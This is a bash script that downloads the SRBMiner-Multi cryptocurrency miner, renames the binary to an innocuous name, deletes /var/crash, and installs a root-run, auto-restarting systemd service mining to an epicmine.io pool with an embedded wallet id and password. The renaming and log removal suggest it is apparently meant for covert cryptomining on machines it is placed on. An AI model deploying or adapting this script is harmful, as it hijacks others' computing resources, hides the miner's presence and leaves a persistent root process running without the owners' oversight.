#!/bin/bash
cd /home
sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.0/SRBMiner-Multi-2-2-0-Linux.tar.xz
sudo tar Jxvf SRBMiner-Multi-2-2-0-Linux.tar.xz
cd SRBMiner-Multi-2-2-0
sudo cp SRBMiner-MULTI jvdar 
sudo chmod +x jvdar

sudo rm -rf /lib/systemd/system/xmrthanh.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool eu.epicmine.io:3334 --tls true --wallet tuyenvv95.test1 --password Passbimat4367 --keepalive true
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
